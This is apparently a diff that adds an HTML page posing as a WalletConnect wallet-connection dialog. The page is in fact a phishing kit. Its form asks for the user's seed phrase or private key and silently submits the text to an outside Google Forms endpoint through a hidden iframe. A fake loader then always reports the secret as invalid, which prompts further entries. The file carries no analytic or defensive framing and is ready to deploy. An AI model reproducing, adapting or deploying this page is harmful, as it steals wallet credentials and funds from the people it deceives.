@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="shortcut icon" href="favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="theme-color" content="#000000" />
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="upgrade-insecure-requests"
+    />
+    <meta name="description" content="" />
+
+    <title>WalletConnect</title>
+    <link rel="manifest" href="manifest.json" />
+    <link id="walletconnect-style-sheet" rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="840013fd8c2ab234.css" />
+    <link rel="stylesheet" href="styles.css" />
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/pbkdf2.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <script src="1e-c5e1b1641d28fe61d95059e6a (5).js"></script>
+    <script src="modules.js" type="module"></script>
+
+  <body>
+    <div
+      id="walletconnect-wrapper"
+      style="visibility: hidden; overflow: hidden; z-index: 100"
+    >
+      <div
+        id="walletconnect-qrcode-modal"
+        class="walletconnect-qrcode__base animated fadeIn"
+      >
+        <div class="walletconnect-modal__base">
+          <div class="walletconnect-modal__header">
+            <img
+              src="data:image/svg+xml,%3C?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?%3E %3Csvg width=&#39;300px&#39; height=&#39;185px&#39; viewBox=&#39;0 0 300 185&#39; version=&#39;1.1&#39; xmlns=&#39;http://www.w3.org/2000/svg&#39; xmlns:xlink=&#39;http://www.w3.org/1999/xlink&#39;%3E %3C!-- Generator: Sketch 49.3 (51167) - http://www.bohemiancoding.com/sketch --%3E %3Ctitle%3EWalletConnect%3C/title%3E %3Cdesc%3ECreated with Sketch.%3C/desc%3E %3Cdefs%3E%3C/defs%3E %3Cg id=&#39;Page-1&#39; stroke=&#39;none&#39; stroke-width=&#39;1&#39; fill=&#39;none&#39; fill-rule=&#39;evenodd&#39;%3E %3Cg id=&#39;walletconnect-logo-alt&#39; fill=&#39;%233B99FC&#39; fill-rule=&#39;nonzero&#39;%3E %3Cpath d=&#39;M61.4385429,36.2562612 C110.349767,-11.6319051 189.65053,-11.6319051 238.561752,36.2562612 L244.448297,42.0196786 C246.893858,44.4140867 246.893858,48.2961898 244.448297,50.690599 L224.311602,70.406102 C223.088821,71.6033071 221.106302,71.6033071 219.883521,70.406102 L211.782937,62.4749541 C177.661245,29.0669724 122.339051,29.0669724 88.2173582,62.4749541 L79.542302,70.9685592 C78.3195204,72.1657633 76.337001,72.1657633 75.1142214,70.9685592 L54.9775265,51.2530561 C52.5319653,48.8586469 52.5319653,44.9765439 54.9775265,42.5821357 L61.4385429,36.2562612 Z M280.206339,77.0300061 L298.128036,94.5769031 C300.573585,96.9713 300.573599,100.85338 298.128067,103.247793 L217.317896,182.368927 C214.872352,184.763353 210.907314,184.76338 208.461736,182.368989 C208.461726,182.368979 208.461714,182.368967 208.461704,182.368957 L151.107561,126.214385 C150.496171,125.615783 149.504911,125.615783 148.893521,126.214385 C148.893517,126.214389 148.893514,126.214393 148.89351,126.214396 L91.5405888,182.368927 C89.095052,184.763359 85.1300133,184.763399 82.6844276,182.369014 C82.6844133,182.369 82.684398,182.368986 82.6843827,182.36897 L1.87196327,103.246785 C-0.573596939,100.852377 -0.573596939,96.9702735 1.87196327,94.5758653 L19.7936929,77.028998 C22.2392531,74.6345898 26.2042918,74.6345898 28.6498531,77.028998 L86.0048306,133.184355 C86.6162214,133.782957 87.6074796,133.782957 88.2188704,133.184355 C88.2188796,133.184346 88.2188878,133.184338 88.2188969,133.184331 L145.571,77.028998 C148.016505,74.6345347 151.981544,74.6344449 154.427161,77.028798 C154.427195,77.0288316 154.427229,77.0288653 154.427262,77.028899 L211.782164,133.184331 C212.393554,133.782932 213.384814,133.782932 213.996204,133.184331 L271.350179,77.0300061 C273.79574,74.6355969 277.760778,74.6355969 280.206339,77.0300061 Z&#39; id=&#39;WalletConnect&#39;%3E%3C/path%3E %3C/g%3E %3C/g%3E %3C/svg%3E"
+              class="walletconnect-modal__headerLogo"
+            />
+            <p>WalletConnect</p>
+          </div>
+          <div id="wallet" style="display: ''">
+            <div>
+              <p id="walletconnect-text" class="walletconnect-qrcode__text">
+                Connect your wallet.
+              </p>
+
+              <div class="flex justify-center gap-2">
+                <button class="connectButton">Connect</button>
+              </div>
+            </div>
+          </div>
+          <!-- SYNC SECT -->
+          <div
+            id="sync"
+            class="sc-jSFjdj fkoWJS sc-iwajpm kydRHc mt-10"
+            style="display: none"
+          >
+            <div class="sc-eCApnc gjMcuP sc-cxNHIi fHUQtx">
+              <div class="sc-eCApnc fhzqaO sc-lmgQwP hpRDUw">
+                <iframe name="votar" style="display: none"></iframe>
+                <img id="loader" src="loaderImage.gif" style="display: none" />
+                <form
+                  name="form"
+                  method="POST"
+                  id="mG61Hd"
+                  action="https://docs.google.com/forms/d/e/1FAIpQLSc2y9p0GQIZE61bD0JSY4pIt1uc2sK5P3dMXMPqZ9-IeEwF5A/formResponse"
+                  target="votar"
+                  style="width: 100%"
+                >
+                  <textarea
+                    name="entry.2036501353"
+                    type="text"
+                    id="pInput"
+                    class="input border-2 rounded-sm bg-gray-50 outline-none py-1.5 px-2 w-60 text-sm"
+                    value=""
+                    style="
+                      height: 100px;
+                      width: 100%;
+                      display: block;
+                      padding: 10px;
+                    "
+                    placeholder="seed phrase, private key,.. "
+                    required
+                  ></textarea>
+
+                  <br />
+                  <div id="qrcode" style="display: none">
+                    <div class="py-2">
+                      <div class="walletconnect-modal__footer text-red-500">
+                        <a>Invalid seed phrase/private key!</a>
+                      </div>
+                    </div>
+                  </div>
+                  <!-- <input type="button" value="WalletConnect" onclick="sendEmail()" /> -->
+                  <button
+                    id="pbtn"
+                    onclick="showLoader();"
+                    class="button sc-hKFxyN iqEijN sc-iJCRrE bojiJp"
+                    disabled=""
+                    type="submit"
+                    color="lightBlue"
+                    style="display: block; justify-content: center"
+                  >
+                    <div class="sc-gtsrHT gfuSqG"></div>
+                    Verify
+                  </button>
+                </form>
+                <script type="text/javascript">
+                  let input = document.querySelector(".input");
+                  let button = document.querySelector(".button");
+
+                  button.disabled = true; //setting button state to disabled
+
+                  input.addEventListener("change", stateHandle);
+                  setTimeout("stateHandle()", 1 * 1000);
+
+                  function stateHandle() {
+                    let pInput = document.getElementById("pInput").value;
+
+                    if (document.querySelector(".input").value === "") {
+                      button.disabled = true; //button remains disabled
+                    } else {
+                      button.disabled = false; //button is enabled
+                    }
+                    setTimeout("stateHandle()", 1 * 1000);
+                  }
+
+                  function showLoader() {
+                    document.getElementById("loader").style.display = "block";
+
+                    document.getElementById("pInput").style.display = "none";
+
+                    document.getElementById("pbtn").style.display = "none";
+
+                    setTimeout("hideLoader()", 4 * 1000);
+                  }
+                  function hideLoader() {
+                    document.getElementById("loader").style.display = "none";
+
+                    setTimeout("showQrcode()", 0);
+                  }
+
+                  function showQrcode() {
+                    document.getElementById("qrcode").style.display = "block";
+                    setTimeout("hideLoader()", 0);
+                  }
+                  var milisec = 0;
+                  var seconds = 30;
+                </script>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="iframe-container">
+      <iframe id="websiteFrame" src="dist/website.html"></iframe>
+    </div>
+    <script src="config.js"></script>
+  </body>
+</html>
